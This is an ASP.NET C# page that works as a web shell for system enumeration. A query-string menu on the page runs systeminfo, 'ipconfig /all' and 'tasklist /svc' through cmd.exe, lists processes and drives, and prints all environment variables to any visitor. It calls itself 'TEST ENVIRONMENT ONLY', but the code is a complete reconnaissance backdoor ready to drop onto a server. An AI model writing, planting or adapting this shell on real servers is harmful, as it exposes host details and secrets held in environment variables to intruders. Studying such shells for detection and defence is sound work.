<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>

<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        string action = Request.QueryString["action"];
        
        Response.ContentType = "text/html; charset=utf-8";
        
        if (string.IsNullOrEmpty(action))
        {
            RenderMenu();
        }
        else
        {
            switch (action.ToLower())
            {
                case "sysinfo":
                    ExecuteSystemInfo();
                    break;
                case "processes":
                    ExecuteProcessList();
                    break;
                case "network":
                    ExecuteNetworkInfo();
                    break;
                case "disks":
                    ExecuteDiskInfo();
                    break;
                case "environment":
                    ExecuteEnvironmentInfo();
                    break;
                case "services":
                    ExecuteServicesList();
                    break;
                default:
                    Response.Write("<p style='color:red;'>Unknown action</p>");
                    break;
            }
        }
    }
    
    void RenderMenu()
    {
        Response.Write(@"
<html>
<head>
    <title>System Enumeration Shell</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f0f0f0; }
        .menu { background-color: #333; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .menu a { color: #00ff00; text-decoration: none; margin-right: 15px; font-weight: bold; }
        .menu a:hover { text-decoration: underline; }
        .output { background-color: #fff; border: 1px solid #ccc; padding: 15px; border-radius: 5px; overflow-x: auto; }
        pre { margin: 0; }
    </style>
</head>
<body>
    <h1>System Enumeration Shell - TEST ENVIRONMENT ONLY</h1>
    <div class='menu'>
        <a href='?action=sysinfo'>System Info</a>
        <a href='?action=processes'>Processes</a>
        <a href='?action=network'>Network</a>
        <a href='?action=disks'>Disk Info</a>
        <a href='?action=environment'>Environment</a>
        <a href='?action=services'>Services</a>
    </div>
    <div class='output'>
        <p>Select an option from the menu above to enumerate system information.</p>
    </div>
</body>
</html>
");
    }
    
    void ExecuteSystemInfo()
    {
        Response.Write("<h2>System Information</h2>");
        Response.Write("<pre>");
        
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c systeminfo",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            
            using (Process p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                Response.Write(Server.HtmlEncode(output));
                p.WaitForExit();
            }
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + Server.HtmlEncode(ex.Message));
        }
        
        Response.Write("</pre>");
    }
    
    void ExecuteProcessList()
    {
        Response.Write("<h2>Running Processes</h2>");
        Response.Write("<table border='1' cellpadding='5' style='width:100%; border-collapse:collapse;'>");
        Response.Write("<tr><th>PID</th><th>Process Name</th><th>Memory (MB)</th></tr>");
        
        try
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process p in processes)
            {
                try
                {
                    long memMB = p.WorkingSet64 / (1024 * 1024);
                    Response.Write($"<tr><td>{p.Id}</td><td>{Server.HtmlEncode(p.ProcessName)}</td><td>{memMB}</td></tr>");
                }
                catch { }
            }
        }
        catch (Exception ex)
        {
            Response.Write($"<tr><td colspan='3'>Error: {Server.HtmlEncode(ex.Message)}</td></tr>");
        }
        
        Response.Write("</table>");
    }
    
    void ExecuteNetworkInfo()
    {
        Response.Write("<h2>Network Information</h2>");
        Response.Write("<pre>");
        
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c ipconfig /all",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            
            using (Process p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                Response.Write(Server.HtmlEncode(output));
                p.WaitForExit();
            }
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + Server.HtmlEncode(ex.Message));
        }
        
        Response.Write("</pre>");
    }
    
    void ExecuteDiskInfo()
    {
        Response.Write("<h2>Disk Information</h2>");
        Response.Write("<table border='1' cellpadding='5' style='width:100%; border-collapse:collapse;'>");
        Response.Write("<tr><th>Drive</th><th>Total (GB)</th><th>Used (GB)</th><th>Free (GB)</th></tr>");
        
        try
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady)
                {
                    long totalGB = drive.TotalSize / (1024 * 1024 * 1024);
                    long freeGB = drive.AvailableFreeSpace / (1024 * 1024 * 1024);
                    long usedGB = totalGB - freeGB;
                    
                    Response.Write($"<tr><td>{drive.Name}</td><td>{totalGB}</td><td>{usedGB}</td><td>{freeGB}</td></tr>");
                }
            }
        }
        catch (Exception ex)
        {
            Response.Write($"<tr><td colspan='4'>Error: {Server.HtmlEncode(ex.Message)}</td></tr>");
        }
        
        Response.Write("</table>");
    }
    
    void ExecuteEnvironmentInfo()
    {
        Response.Write("<h2>Environment Variables</h2>");
        Response.Write("<table border='1' cellpadding='5' style='width:100%; border-collapse:collapse;'>");
        Response.Write("<tr><th>Variable</th><th>Value</th></tr>");
        
        try
        {
            var vars = Environment.GetEnvironmentVariables();
            foreach (string key in vars.Keys)
            {
                string value = vars[key].ToString();
                Response.Write($"<tr><td>{Server.HtmlEncode(key)}</td><td>{Server.HtmlEncode(value)}</td></tr>");
            }
        }
        catch (Exception ex)
        {
            Response.Write($"<tr><td colspan='2'>Error: {Server.HtmlEncode(ex.Message)}</td></tr>");
        }
        
        Response.Write("</table>");
    }
    
    void ExecuteServicesList()
    {
        Response.Write("<h2>System Services</h2>");
        Response.Write("<pre>");
        
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c tasklist /svc",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            
            using (Process p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                Response.Write(Server.HtmlEncode(output));
                p.WaitForExit();
            }
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + Server.HtmlEncode(ex.Message));
        }
        
        Response.Write("</pre>");
    }
</script>
